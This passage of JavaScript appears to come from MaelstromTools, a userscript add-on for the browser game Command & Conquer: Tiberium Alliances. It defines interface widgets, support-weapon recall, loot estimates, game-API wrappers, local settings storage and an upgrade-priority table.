                  var cityCache = this.Cache[cityName]; 
                  colIdx = 1; 
 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityName, 100, 'left', null, (cityCache.IsAlerted ? 'red' : null)); 
 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.GetStepTime(cityCache.CooldownEnd), 70, 'right'); 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, MaelstromTools.Wrapper.GetStepTime(cityCache.ProtectionEnd), 70, 'right'); 
 
                  if (!cityCache.HasSupportWeapon) { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, "none", 140, 'left'); 
                    colIdx += 2; 
                  } else { 
                    supportWeaponCount++; 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.SupportName + " (" + cityCache.SupportLevel + ")", 140, 'left'); 
 
                    if (cityCache.SupportedCityId > 0) { 
                      MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx++, cityCache.SupportedCityName, 140, 'left'); 
                      colIdxRecall = colIdx; 
                      MaelstromTools.Util.addElement(this.Widget, rowIdx, colIdx++, this.getRecallButton(cityName)); 
                    } else { 
                      colIdx += 2; 
                    } 
                  } 
 
                  MaelstromTools.Util.addElement(this.Widget, rowIdx, colIdx++, MaelstromTools.Util.getAccessBaseButton(cityName)); 
                  MaelstromTools.Util.addElement(this.Widget, rowIdx, colIdx++, MaelstromTools.Util.getFocusBaseButton(cityName)); 
 
                  rowIdx++; 
                } 
 
                if (supportWeaponCount > 0 && colIdxRecall > 0) { 
                  MaelstromTools.Util.addElement(this.Widget, rowIdxRecall, colIdxRecall, this.getRecallAllButton()); 
                } 
              } catch (e) { 
                console.log("MaelstromTools.BaseStatus.setWidgetLabels: ", e); 
              } 
            }, 
 
            getRecallAllButton: function () { 
              var button = new qx.ui.form.Button("Recall all").set({ 
                appearance: "button-text-small", 
                toolTipText: "Recall all support weapons", 
                width: 100, 
                height: 20 
              }); 
              button.addListener("execute", function (e) { 
                MaelstromTools.Util.recallAllSupport(); 
              }, this); 
              return button; 
            }, 
 
            getRecallButton: function (cityName) { 
              var button = new qx.ui.form.Button("Recall").set({ 
                appearance: "button-text-small", 
                toolTipText: "Recall support to " + cityName, 
                width: 100, 
                height: 20 
              }); 
              button.addListener("execute", function (e) { 
                MaelstromTools.Util.recallSupport(cityName); 
              }, this); 
              return button; 
            } 
            /* 
            getCalibrateAllOnSelectedBaseButton: function() { 
              var button = new qx.ui.form.Button("Calibrate all weapons on selected base").set({ 
                appearance: "button-text-small", 
                toolTipText: "Calibrate all weapons", 
                width: 100, 
                height: 20 
              }); 
              button.addListener("execute", function(e){ 
                Util.calibrateWholeSupport(ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentCityId()); 
              }, this); 
              return button; 
            }*/ 
 
 
          } 
        }); 
 
        // define Statics 
        qx.Class.define("MaelstromTools.Statics", { 
          type: "static", 
          statics: { 
            Tiberium: 'Tiberium', 
            Crystal: 'Crystal', 
            Power: 'Power', 
            Dollar: 'Dollar', 
            Research: 'Research', 
            Vehicle: "Vehicle", 
            Aircraft: "Aircraft", 
            Infantry: "Infantry", 
 
            LootTypeName: function (ltype) { 
              switch (ltype) { 
                case ClientLib.Base.EResourceType.Tiberium: 
                  return MaelstromTools.Statics.Tiberium; 
                  break; 
                case ClientLib.Base.EResourceType.Crystal: 
                  return MaelstromTools.Statics.Crystal; 
                  break; 
                case ClientLib.Base.EResourceType.Power: 
                  return MaelstromTools.Statics.Power; 
                  break; 
                case ClientLib.Base.EResourceType.Gold: 
                  return MaelstromTools.Statics.Dollar; 
                  break; 
                default: 
                  return ""; 
                  break; 
              } 
            } 
          } 
        }); 
 
        // define Util 
        //ClientLib.Data.Cities.prototype.GetCityByCoord 
        //ClientLib.Data.City.prototype.get_HasIncommingAttack 
        qx.Class.define("MaelstromTools.Util", { 
          type: "static", 
          statics: { 
            ArrayUnique: function (array) { 
              var o = {}; 
              var l = array.length; 
              r = []; 
              for (var i = 0; i < l; i++) o[array[i]] = array[i]; 
              for (var i in o) r.push(o[i]); 
              return r; 
            }, 
 
            ArraySize: function (array) { 
              var size = 0; 
              for (var key in array) 
              if (array.hasOwnProperty(key)) size++; 
              return size; 
            }, 
 
            addLabel: function (widget, rowIdx, colIdx, value, width, textAlign, font, color, colSpan) { 
              try { 
                var label = new qx.ui.basic.Label().set({ 
                  value: Lang.gt(value) 
                }); 
                if (width) { 
                  label.setWidth(width); 
                } 
                if (textAlign) { 
                  label.setTextAlign(textAlign); 
                } 
                if (color) { 
                  label.setTextColor(color); 
                } 
                if (font) { 
                  label.setFont(font); 
                } 
                if (!colSpan || colSpan == 0) { 
                  colSpan = 1; 
                } 
 
                widget.add(label, { 
                  row: rowIdx, 
                  column: colIdx, 
                  colSpan: colSpan 
                }); 
              } catch (e) { 
                console.log("MaelstromTools.Util.addLabel: ", e); 
              } 
            }, 
 
            addElement: function (widget, rowIdx, colIdx, element, colSpan) { 
              try { 
                if (!colSpan || colSpan == 0) { 
                  colSpan = 1; 
                } 
                widget.add(element, { 
                  row: rowIdx, 
                  column: colIdx, 
                  colSpan: colSpan 
                }); 
              } catch (e) { 
                console.log("MaelstromTools.Util.addElement: ", e); 
              } 
            }, 
 
            addImage: function (widget, rowIdx, colIdx, image) { 
              try { 
                widget.add(image, { 
                  row: rowIdx, 
                  column: colIdx 
                }); 
              } catch (e) { 
                console.log("MaelstromTools.Util.addImage: ", e); 
              } 
            }, 
 
            getImage: function (name) { 
              var image = new qx.ui.basic.Image(MT_Base.images[name]); 
              image.setScale(true); 
              image.setWidth(20); 
              image.setHeight(20); 
              return image; 
            }, 
 
            getAccessBaseButton: function (cityName, viewMode) { 
              try { 
                var cityButton = new qx.ui.form.Button(null, MT_Base.images["AccessBase"]).set({ 
                  appearance: "button-detailview-small", 
                  toolTipText: Lang.gt("Access") + " " + cityName, 
                  width: 20, 
                  height: 20, 
                  marginLeft: 5 
                }); 
                cityButton.setUserData("cityId", MT_Cache.Cities[cityName].ID); 
                cityButton.setUserData("viewMode", viewMode); 
                cityButton.addListener("execute", function (e) { 
                  MaelstromTools.Util.accessBase(e.getTarget().getUserData("cityId"), e.getTarget().getUserData("viewMode")); 
                }, this); 
                return cityButton; 
              } catch (e) { 
                console.log("MaelstromTools.Util.getAccessBaseButton: ", e); 
              } 
            }, 
 
            getFocusBaseButton: function (cityName) { 
              try { 
                var cityButton = new qx.ui.form.Button(null, MT_Base.images["FocusBase"]).set({ 
                  appearance: "button-detailview-small", 
                  toolTipText: Lang.gt("Focus on") + " " + cityName, 
                  width: 20, 
                  height: 20, 
                  marginLeft: 5 
                }); 
                cityButton.setUserData("cityId", MT_Cache.Cities[cityName].ID); 
                cityButton.addListener("execute", function (e) { 
                  MaelstromTools.Util.focusBase(e.getTarget().getUserData("cityId")); 
                }, this); 
                return cityButton; 
              } catch (e) { 
                console.log("MaelstromTools.Util.getFocusBaseButton: ", e); 
              } 
            }, 
 
            accessBase: function (cityId, viewMode) { 
              try { 
                if (cityId > 0) { 
                  var ncity = MaelstromTools.Wrapper.GetCity(cityId); 
 
                  if (ncity != null && !ncity.get_IsGhostMode()) { 
                    if (viewMode) { 
                      webfrontend.gui.UtilView.openVisModeInMainWindow(viewMode, cityId, false); 
                    } else { 
                      webfrontend.gui.UtilView.openCityInMainWindow(cityId); 
                    } 
                  } 
                } 
              } catch (e) { 
                console.log("MaelstromTools.Util.accessBase: ", e); 
              } 
            }, 
            focusBase: function (cityId) { 
              try { 
                if (cityId > 0) { 
                  var ncity = MaelstromTools.Wrapper.GetCity(cityId); 
 
                  if (ncity != null && !ncity.get_IsGhostMode()) { 
                    webfrontend.gui.UtilView.centerCityOnRegionViewWindow(cityId); 
                  } 
                } 
              } catch (e) { 
                console.log("MaelstromTools.Util.focusBase: ", e); 
              } 
            }, 
 
            recallSupport: function (cityName) { 
              try { 
                var ncity = MT_Cache.Cities[cityName]["Object"]; 
                ncity.RecallDedicatedSupport(); 
              } catch (e) { 
                console.log("MaelstromTools.Util.recallSupport: ", e); 
              } 
            }, 
 
            recallAllSupport: function () { 
              try { 
                MT_Cache.updateCityCache(); 
                for (var cityName in MT_Cache.Cities) { 
                  var ncity = MT_Cache.Cities[cityName]["Object"]; 
                  ncity.RecallDedicatedSupport(); 
                } 
              } catch (e) { 
                console.log("MaelstromTools.Util.recallAllSupport: ", e); 
              } 
            }, 
 
            checkIfSupportIsAllowed: function (selectedBase) { 
              try { 
                if (selectedBase.get_VisObjectType() != ClientLib.Vis.VisObject.EObjectType.RegionCityType) { 
                  return false; 
                } 
                if (selectedBase.get_Type() != ClientLib.Vis.Region.RegionCity.ERegionCityType.Own && selectedBase.get_Type() != ClientLib.Vis.Region.RegionCity.ERegionCityType.Alliance) { 
                  return false; 
                } 
                return true; 
              } catch (e) { 
                console.log("MaelstromTools.Util.checkIfSupportIsAllowed: ", e); 
                return false; 
              } 
            }, 
 
            calibrateWholeSupportOnSelectedBase: function () { 
              if (this.checkIfSupportIsAllowed(MT_Cache.SelectedBaseForMenu)) { 
                this.calibrateWholeSupport(MT_Cache.SelectedBaseForMenu); 
              } 
            }, 
 
            calibrateWholeSupport: function (targetRegionCity) { 
              try { 
                MT_Cache.updateCityCache(); 
                for (var cityName in MT_Cache.Cities) { 
                  var ncity = MT_Cache.Cities[cityName]["Object"]; 
                  //var targetCity = MaelstromTools.Wrapper.GetCity(targetCityId); 
                  var weapon = ncity.get_SupportWeapon(); 
 
                  //console.log("checking support weapon for " + ncity.get_Name() + " calibrating on " + targetRegionCity.get_Name()); 
 
                  if (targetRegionCity != null && weapon != null) { 
                    //console.log("city at " + ncity.get_X() + " / " + ncity.get_Y()); 
                    //console.log("targetRegionCity at " + targetRegionCity.get_RawX() + " / " + targetRegionCity.get_RawY()); 
                    //var distance = ClientLib.Base.Util.CalculateDistance(ncity.get_X(), ncity.get_Y(), targetRegionCity.get_RawX(), targetRegionCity.get_RawY()); 
                    var dx = (ncity.get_X() - targetRegionCity.get_RawX()); 
                    var dy = (ncity.get_Y() - targetRegionCity.get_RawY()); 
                    var distance = ((dx * dx) + (dy * dy)); 
                    var range = MaelstromTools.Wrapper.GetSupportWeaponRange(weapon); 
                    //console.log("distance is " + distance); 
                    //console.log("range isy " + range*range); 
                    if (distance <= (range * range)) { 
                      ncity.SetDedicatedSupport(targetRegionCity.get_Id()); 
                    } 
                  } 
                } 
              } catch (e) { 
                console.log("MaelstromTools.Util.calibrateWholeSupport: ", e); 
              } 
            }, 
 
            // visCity : ClientLib.Vis.Region.RegionObject 
            getResources: function (visCity) { // to verifier against PerforceChangelist>=376877 
              try { 
                var loot = new Object(); 
                if (visCity.get_X() < 0 || visCity.get_Y() < 0) { 
                  loot["LoadState"] = 0; 
                  return loot; 
                } 
                var currentOwnCity = ClientLib.Data.MainData.GetInstance().get_Cities().get_CurrentOwnCity(); 
 
                var distance = ClientLib.Base.Util.CalculateDistance(currentOwnCity.get_X(), currentOwnCity.get_Y(), visCity.get_RawX(), visCity.get_RawY()); 
                var maxAttackDistance = ClientLib.Data.MainData.GetInstance().get_Server().get_MaxAttackDistance(); 
                if (distance > maxAttackDistance) { 
                  loot["LoadState"] = -1; 
                  return loot; 
                } 
 
                var ncity = MaelstromTools.Wrapper.GetCity(visCity.get_Id()); 
                /* ClientLib.Data.CityBuildings */ 
                //var cityBuildings = ncity.get_CityBuildingsData(); 
                var cityUnits = ncity.get_CityUnitsData(); 
 
                //var buildings = MaelstromTools.Wrapper.GetBuildings(cityBuildings); 
                var buildings = ncity.get_Buildings().d; 
                var defenseUnits = MaelstromTools.Wrapper.GetDefenseUnits(cityUnits); 
                //var defenseUnits = MaelstromTools.Wrapper.GetDefenseUnits(); 
 
                /*for(var u in buildings) { 
              console.log(buildings[u].get_MdbBuildingId()); 
              console.log("----------------"); 
            }*/ 
 
                var buildingLoot = MaelstromTools.Util.getResourcesPart(buildings); 
                //var buildingLoot2 = MaelstromTools.Util.getResourcesPart(this.collectBuildings(ncity)); 
 
                var unitLoot = MaelstromTools.Util.getResourcesPart(defenseUnits); 
 
                loot[MaelstromTools.Statics.Tiberium] = buildingLoot[ClientLib.Base.EResourceType.Tiberium] + unitLoot[ClientLib.Base.EResourceType.Tiberium]; 
                loot[MaelstromTools.Statics.Crystal] = buildingLoot[ClientLib.Base.EResourceType.Crystal] + unitLoot[ClientLib.Base.EResourceType.Crystal]; 
                loot[MaelstromTools.Statics.Dollar] = buildingLoot[ClientLib.Base.EResourceType.Gold] + unitLoot[ClientLib.Base.EResourceType.Gold]; 
                loot[MaelstromTools.Statics.Research] = buildingLoot[ClientLib.Base.EResourceType.ResearchPoints] + unitLoot[ClientLib.Base.EResourceType.ResearchPoints]; 
                loot["Factor"] = loot[MaelstromTools.Statics.Tiberium] + loot[MaelstromTools.Statics.Crystal] + loot[MaelstromTools.Statics.Dollar] + loot[MaelstromTools.Statics.Research]; 
                loot["CPNeeded"] = currentOwnCity.CalculateAttackCommandPointCostToCoord(ncity.get_X(), ncity.get_Y()); 
                loot["LoadState"] = (loot["Factor"] > 0 ? 1 : 0); 
                loot["Total"] = loot[MaelstromTools.Statics.Research] + loot[MaelstromTools.Statics.Tiberium] + loot[MaelstromTools.Statics.Crystal] + loot[MaelstromTools.Statics.Dollar]; 
 
                /*console.log("Building loot"); 
                console.log( buildingLoot[ClientLib.Base.EResourceType.Tiberium] + " vs " +  buildingLoot2[ClientLib.Base.EResourceType.Tiberium]); 
                console.log( buildingLoot[ClientLib.Base.EResourceType.Crystal] + " vs " +  buildingLoot2[ClientLib.Base.EResourceType.Crystal]); 
                console.log( buildingLoot[ClientLib.Base.EResourceType.Gold] + " vs " +  buildingLoot2[ClientLib.Base.EResourceType.Gold]); 
                console.log( buildingLoot[ClientLib.Base.EResourceType.ResearchPoints] + " vs " +  buildingLoot2[ClientLib.Base.EResourceType.ResearchPoints]); 
                console.log("-------------");*/ 
                return loot; 
              } catch (e) { 
                console.log("MaelstromTools.Util.getResources", e); 
              } 
            }, 
            /* 
            collectBuildings: function(ncity) { 
              var cityBuildings = ncity.get_CityBuildingsData(); 
              var buildings = new Array(); 
              var count = 0; 
              // ncity.GetNumBuildings() 
              for(var i = 0; i < 100000; i++) { 
                var building = cityBuildings.GetBuildingByMDBId(i); 
                if(!building) { 
                  continue; 
                } 
                 
                //console.log(building.get_TechName() + " - " + ncity.get_CityFaction() + " - " + ClientLib.Base.Tech.GetTechIdFromTechNameAndFaction(building.get_TechName(), ncity.get_CityFaction()) + " at lvl " + building.get_CurrentLevel()); 
                buildings.push(building); 
              //buildings[count++] = building; 
              } 
              return buildings; //MaelstromTools.Util.ArrayUnique(buildings); 
            },*/ 
 
            getResourcesPart: function (cityEntities) { 
              try { 
                var loot = [0, 0, 0, 0, 0, 0, 0, 0]; 
                if (cityEntities == null) { 
                  return loot; 
                } 
 
                var objcityEntities = []; 
                if (PerforceChangelist >= 376877) { //new 
                  for (var o in cityEntities) objcityEntities.push(cityEntities[o]); 
                } else { //old 
                  for (var i = 0; i < cityEntities.length; i++) objcityEntities.push(cityEntities[i]); 
                } 
 
                for (var i = 0; i < objcityEntities.length; i++) { 
                  var cityEntity = objcityEntities[i]; 
                  var unitLevelRequirements = MaelstromTools.Wrapper.GetUnitLevelRequirements(cityEntity); 
 
                  for (var x = 0; x < unitLevelRequirements.length; x++) { 
                    loot[unitLevelRequirements[x].Type] += unitLevelRequirements[x].Count * cityEntity.get_HitpointsPercent(); 
                    if (cityEntity.get_HitpointsPercent() < 1.0) { 
                      // destroyed 
 
                    } 
                  } 
                } 
 
                return loot; 
              } catch (e) { 
                console.log("MaelstromTools.Util.getResourcesPart", e); 
              } 
            } 
 
            /* 
            findBuildings: function(city) { 
              for (var k in city) { 
                if ((typeof(city[k]) == "object") && city[k] && city[k] && 0 in city[k]) { 
                  if ((typeof(city[k][0]) == "object")  && city[k][0] && "BuildingDBId" in city[k][0]) { 
                    return city[k]; 
                  } 
                } 
              } 
              return []; 
            }*/ 
          } 
        }); 
 
        // define Wrapper 
        qx.Class.define("MaelstromTools.Wrapper", { 
          type: "static", 
          statics: { 
            GetStepTime: function (step, defaultString) { 
              if (!defaultString) { 
                defaultString = ""; 
              } 
              var endTime = ClientLib.Data.MainData.GetInstance().get_Time().GetTimespanString(step, ClientLib.Data.MainData.GetInstance().get_Time().GetServerStep()); 
              if (endTime == "00:00") { 
                return defaultString; 
              } 
              return endTime; 
            }, 
 
            FormatNumbersCompact: function (value) { 
              if (PerforceChangelist >= 387751) { //new 
                return phe.cnc.gui.util.Numbers.formatNumbersCompact(value); 
              } else { //old 
                return webfrontend.gui.Util.formatNumbersCompact(value); 
              } 
            }, 
 
            GetDateTimeString: function (value) { 
                return phe.cnc.Util.getDateTimeString(value); 
            }, 
 
            FormatTimespan: function (value) { 
              return ClientLib.Vis.VisMain.FormatTimespan(value); 
            }, 
 
            GetSupportWeaponRange: function (weapon) { 
              return weapon.r; 
            }, 
 
            GetCity: function (cityId) { 
              return ClientLib.Data.MainData.GetInstance().get_Cities().GetCity(cityId); 
            }, 
 
            RepairAll: function (ncity, visMode) { 
              var oldMode = ClientLib.Vis.VisMain.GetInstance().get_Mode(); 
              ClientLib.Vis.VisMain.GetInstance().set_Mode(visMode); 
              ncity.RepairAll(); 
              ClientLib.Vis.VisMain.GetInstance().set_Mode(oldMode); 
            }, 
 
            CanRepairAll: function (ncity, viewMode) { 
              try { 
                /*var oldMode = ClientLib.Vis.VisMain.GetInstance().get_Mode(); 
                ClientLib.Vis.VisMain.GetInstance().set_Mode(visMode); 
                var retVal = ncity.CanRepairAll(); 
                ClientLib.Vis.VisMain.GetInstance().set_Mode(oldMode); 
                return retVal;*/ 
 
                var repairData = ncity.get_CityRepairData(); 
                var myRepair = repairData.CanRepair(0, viewMode); 
                repairData.UpdateCachedFullRepairAllCost(viewMode); 
                return ((myRepair != null) && (!ncity.get_IsLocked() || (viewMode != ClientLib.Vis.Mode.ArmySetup))); 
 
                return false; 
              } catch (e) { 
                console.log("MaelstromTools.Wrapper.CanRepairAll: ", e); 
                return false; 
              } 
            }, 
            /*GetBuildings: function (cityBuildings) { 
              if (PerforceChangelist >= 376877) { //new 
                return (cityBuildings.get_Buildings() != null ? cityBuildings.get_Buildings().d : null); 
              } else { //old 
                return (cityBuildings.get_Buildings() != null ? cityBuildings.get_Buildings().l : null); 
              } 
            },*/ 
            GetDefenseUnits: function (cityUnits) { 
            //GetDefenseUnits: function () { 
              if (PerforceChangelist >= 392583) { //endgame patch 
                return (cityUnits.get_DefenseUnits() != null ? cityUnits.get_DefenseUnits().d : null); 
              } else { //old 
                var defenseObjects = []; 
                for (var x = 0; x < 9; x++) { 
                  for (var y = 0; y < 8; y++) { 
                    var defenseObject = ClientLib.Vis.VisMain.GetInstance().get_DefenseSetup().GetDefenseObjectFromPosition((x * ClientLib.Vis.VisMain.GetInstance().get_City().get_GridWidth()),(y * ClientLib.Vis.VisMain.GetInstance().get_City().get_GridHeight())); 
                    if (defenseObject !== null && defenseObject.get_CityEntity() !== null) { 
                      defenseObjects.push(defenseObject.get_UnitDetails()); 
                    } 
                  } 
                } 
                return defenseObjects; 
              } 
            }, 
            GetUnitLevelRequirements: function (cityEntity) { 
              if (PerforceChangelist >= 376877) { //new 
                return (cityEntity.get_UnitLevelRepairRequirements() != null ? cityEntity.get_UnitLevelRepairRequirements() : null); 
              } else { //old 
                return (cityEntity.get_UnitLevelRequirements() != null ? cityEntity.get_UnitLevelRequirements() : null); 
              } 
            }, 
 
            GetBaseLevel: function (ncity) { 
              return (Math.floor(ncity.get_LvlBase() * 100) / 100).toFixed(2); 
            } 
            /*, 
             
            GetPointsByLevelWithThresholds: function (_levelThresholds,_levelFactors,_iLevel) { 
              var result=0; 
              var lastLevel=_iLevel; 
              if(_levelThresholds.length != _levelFactors.length) { 
                return 0; 
              } 
              for (var i=(_levelThresholds.length - 1); (i >= 0); i--) { 
                var threshold=(_levelThresholds[i] - 1); 
                if(lastLevel >= threshold) { 
                  result += ((lastLevel - threshold) * _levelFactors[i]); 
                  lastLevel=threshold; 
                } 
              } 
              return result; 
            }, 
            GetArmyPoints: function(_iLevel) { 
              var server = ClientLib.Data.MainData.GetInstance().get_Server(); 
              var m_iArmyPointsPerLevelThresholds = server.get_ArmyPointsPerLevelThresholds(); 
              var m_fArmyPointsPerLevel = server.get_ArmyPointsPerLevel(); 
              _iLevel += 4; 
              var armyPoints = MaelstromTools.Wrapper.GetPointsByLevelWithThresholds(m_iArmyPointsPerLevelThresholds, m_fArmyPointsPerLevel, _iLevel); 
              return Math.min(armyPoints, server.get_MaxArmyPoints()); 
            }, 
             
            GetBuilding: function(ncity, techName) { 
              return ncity.get_CityBuildingsData().GetUniqueBuildingByTechName(techName) 
            }, 
             
            GetCommandCenter: function(ncity) { 
              //var techName = ClientLib.Base.Tech.GetTechIdFromTechNameAndFaction(ClientLib.Base.ETechName.Command_Center, ClientLib.Data.MainData.GetInstance().get_Player().get_Faction()); 
 
              return MaelstromTools.Wrapper.GetBuilding(ncity, ClientLib.Base.ETechName.Command_Center); 
            // conyard return this.GetBuildingCondition$0(ClientLib.Base.Tech.GetTechIdFromTechNameAndFaction$0(0, ClientLib.Data.MainData.GetInstance$9().get_Player$2().get_Faction$2())); 
            // ClientLib.Data.City.prototype.GetOffenseConditionInPercent=ClientLib.Data.City.prototype.GetOffenseConditionInPercent$0; 
            }*/ 
          } 
        }); 
 
        // define LocalStorage 
        qx.Class.define("MaelstromTools.LocalStorage", { 
          type: "static", 
          statics: { 
            isSupported: function () { 
              return typeof (Storage) !== "undefined"; 
            }, 
            set: function (key, value) { 
              try { 
                if (MaelstromTools.LocalStorage.isSupported()) { 
                  localStorage["CCTA_MaelstromTools_" + key] = JSON.stringify(value); 
                } 
              } catch (e) { 
                console.log("MaelstromTools.LocalStorage.set: ", e); 
              } 
            }, 
            get: function (key, defaultValueIfNotSet) { 
              try { 
                if (MaelstromTools.LocalStorage.isSupported()) { 
                  if (localStorage["CCTA_MaelstromTools_" + key] != null && localStorage["CCTA_MaelstromTools_" + key] != 'undefined') { 
                    return JSON.parse(localStorage["CCTA_MaelstromTools_" + key]); 
                  } 
                } 
              } catch (e) { 
                console.log("MaelstromTools.LocalStorage.get: ", e); 
              } 
              return defaultValueIfNotSet; 
            }, 
            clearAll: function () { 
              try { 
                if (!MaelstromTools.LocalStorage.isSupported()) { 
                  return; 
                } 
                for (var key in localStorage) { 
                  if (key.indexOf("CCTA_MaelstromTools_") == 0) { 
                    localStorage.removeItem(key); 
                  } 
                } 
              } catch (e) { 
                console.log("MaelstromTools.LocalStorage.clearAll: ", e); 
              } 
            } 
          } 
        }); 
 
        // define Cache 
        qx.Class.define("MaelstromTools.Cache", { 
          type: "singleton", 
          extend: qx.core.Object, 
          members: { 
            CityCount: 0, 
            Cities: null, 
            SelectedBaseForMenu: null, 
            SelectedBaseResources: null, 
            SelectedBaseForLoot: null, 
 
            updateCityCache: function () { 
              try { 
                this.CityCount = 0; 
                this.Cities = Object(); 
 
                var cities = ClientLib.Data.MainData.GetInstance().get_Cities().get_AllCities(); 
                for (var cindex in cities.d) { 
                  this.CityCount++; 
                  var ncity = MaelstromTools.Wrapper.GetCity(cindex); 
                  var ncityName = ncity.get_Name(); 
                  this.Cities[ncityName] = Object(); 
                  this.Cities[ncityName]["ID"] = cindex; 
                  this.Cities[ncityName]["Object"] = ncity; 
                } 
              } catch (e) { 
                console.log("MaelstromTools.Cache.updateCityCache: ", e); 
              } 
            }, 
 
            updateLoot: function (visCity) { 
              var cityId = visCity.get_Id(); 
 
              if (this.SelectedBaseForLoot != null && cityId == this.SelectedBaseForLoot.get_Id() && this.SelectedBaseResources != null && this.SelectedBaseResources["LoadState"] > 0) { 
                return -2; 
              } 
              this.SelectedBaseForLoot = visCity; 
              this.SelectedBaseResources = MaelstromTools.Util.getResources(visCity); 
              return this.SelectedBaseResources["LoadState"]; 
            } 
          } 
        }); 
 
        // define HuffyTools.ImageRender 
        qx.Class.define("HuffyTools.ImageRender", { 
          extend: qx.ui.table.cellrenderer.AbstractImage, 
          construct: function (width, height) { 
            this.base(arguments); 
            if (width) { 
              this.__imageWidth = width; 
            } 
            if (height) { 
              this.__imageHeight = height; 
            } 
            this.__am = qx.util.AliasManager.getInstance(); 
          }, 
          members: { 
            __am: null, 
            __imageHeight: 16, 
            __imageWidth: 16, 
            // overridden 
            _identifyImage: function (cellInfo) { 
              var imageHints = { 
                imageWidth: this.__imageWidth, 
                imageHeight: this.__imageHeight 
              }; 
              if (cellInfo.value == "") { 
                imageHints.url = null; 
              } else { 
                imageHints.url = this.__am.resolve(cellInfo.value); 
              } 
              imageHints.tooltip = cellInfo.tooltip; 
              return imageHints; 
            } 
          }, 
          destruct: function () { 
            this.__am = null; 
          } 
        }); 
 
        // define HuffyTools.ReplaceRender 
        qx.Class.define("HuffyTools.ReplaceRender", { 
          extend: qx.ui.table.cellrenderer.Default, 
          properties: { 
            replaceFunction: { 
              check: "Function", 
              nullable: true, 
              init: null 
            } 
          }, 
          members: { 
            // overridden 
            _getContentHtml: function (cellInfo) { 
              var value = cellInfo.value; 
              var replaceFunc = this.getReplaceFunction(); 
              // use function 
              if (replaceFunc) { 
                cellInfo.value = replaceFunc(value); 
              } 
              return qx.bom.String.escape(this._formatValue(cellInfo)); 
            } 
          } 
        }); 
 
        qx.Class.define("HuffyTools.CityCheckBox", { 
          extend: qx.ui.form.CheckBox, 
          members: { 
            HT_CityID: null 
          } 
        }); 
 
        // define HuffyTools.UpgradePriorityGUI 
        qx.Class.define("HuffyTools.UpgradePriorityGUI", { 
          type: "singleton", 
          extend: MaelstromTools.DefaultObject, 
          members: { 
            HT_TabView: null, 
            HT_Options: null, 
            HT_ShowOnlyTopBuildings: null, 
            HT_ShowOnlyAffordableBuildings: null, 
            HT_CityBuildings: null, 
            HT_Pages: null, 
            HT_Tables: null, 
            HT_Models: null, 
            HT_SelectedResourceType: null, 
            BuildingList: null, 
            upgradeInProgress: null, 
            init: function () { 
              /* 
              Done: 
              - Added cost per gain to the lists 
              - Added building coordinates to the lists 
              - Only display the top affordable and not affordable building 
              - Persistent filter by city, top and affordable per resource type 
              - Reload onTabChange for speed optimization 
              - Estimated time until upgrade is affordable 
               
              ToDo: 
              - let the user decide to sort by colums he like i.e. timefactor or cost/gain and save it in the configuration 
              - integrate buttons to transfer resources ? 
 
               */ 
              try { 
                this.HT_SelectedResourceType = -1; 
                this.IsTimerEnabled = false; 
                this.upgradeInProgress = false; 
 
                this.HT_TabView = new qx.ui.tabview.TabView(); 
                this.HT_TabView.set({ 
                  contentPadding: 0, 
                  appearance: "tabview", 
                  margin: 5, 
                  barPosition: 'left' 
                }); 
                this.Widget = new qx.ui.tabview.Page("UpgradePriority"); 
                this.Widget.setPadding(0); 
                this.Widget.setMargin(0); 
                this.Widget.setBackgroundColor("#BEC8CF"); 
                this.Widget.setLayout(new qx.ui.layout.VBox(2)); 
                //this.Widget.add(this.HT_Options); 
                this.Widget.add(this.HT_TabView, { 
                  flex: 1 
                }); 
                this.Window.setPadding(0); 
                this.Window.set({ 
                  resizable: true 
                }); 
 
                this.Window.removeAll(); 
                this.Window.add(this.Widget); 
 
                this.BuildingList = new Array; 
                this.HT_Models = new Array; 
                this.HT_Tables = new Array; 
                this.HT_Pages = new Array; 
 
                this.createTabPage(ClientLib.Base.EResourceType.Tiberium); 
                this.createTable(ClientLib.Base.EResourceType.Tiberium); 
                this.HT_Tables[ClientLib.Base.EResourceType.Tiberium].addListener("cellClick", function (e) { 
                  this.upgradeBuilding(e, ClientLib.Base.EResourceType.Tiberium); 
                }, this); 
 
 
                this.createTabPage(ClientLib.Base.EResourceType.Crystal); 
                this.createTable(ClientLib.Base.EResourceType.Crystal); 
                this.HT_Tables[ClientLib.Base.EResourceType.Crystal].addListener("cellClick", function (e) { 
                  this.upgradeBuilding(e, ClientLib.Base.EResourceType.Crystal); 
                }, this); 
 
                this.createTabPage(ClientLib.Base.EResourceType.Power); 
                this.createTable(ClientLib.Base.EResourceType.Power); 
                this.HT_Tables[ClientLib.Base.EResourceType.Power].addListener("cellClick", function (e) { 
                  this.upgradeBuilding(e, ClientLib.Base.EResourceType.Power); 
                }, this); 
 
                this.createTabPage(ClientLib.Base.EResourceType.Gold); 
                this.createTable(ClientLib.Base.EResourceType.Gold); 
                this.HT_Tables[ClientLib.Base.EResourceType.Gold].addListener("cellClick", function (e) { 
                  this.upgradeBuilding(e, ClientLib.Base.EResourceType.Gold); 
                }, this); 
 
 
                MT_Cache.updateCityCache(); 
                this.HT_Options = new Array(); 
                this.HT_ShowOnlyTopBuildings = new Array(); 
                this.HT_ShowOnlyAffordableBuildings = new Array(); 
                this.HT_CityBuildings = new Array(); 
                for (var mPage in this.HT_Pages) { 
                  this.createOptions(mPage); 
                  this.HT_Pages[mPage].add(this.HT_Options[mPage]); 
                  this.HT_Pages[mPage].add(this.HT_Tables[mPage], { 
                    flex: 1 
                  }); 
                  this.HT_TabView.add(this.HT_Pages[mPage]); 
                } 
 
                // Zeigen wir Dollars an ! 
                this.HT_TabView.setSelection([this.HT_TabView.getChildren()[2]]); 
                this.HT_SelectedResourceType = ClientLib.Base.EResourceType.Gold; 
              } catch (e) { 
                console.log("HuffyTools.UpgradePriority.init: ", e); 
              } 
            }, 
            createOptions: function (eType) { 
              var oBox = new qx.ui.layout.Flow(); 
              var oOptions = new qx.ui.container.Composite(oBox); 
              oOptions.setMargin(5); 
              this.HT_ShowOnlyTopBuildings[eType] = new qx.ui.form.CheckBox(Lang.gt("display only top buildings")); 
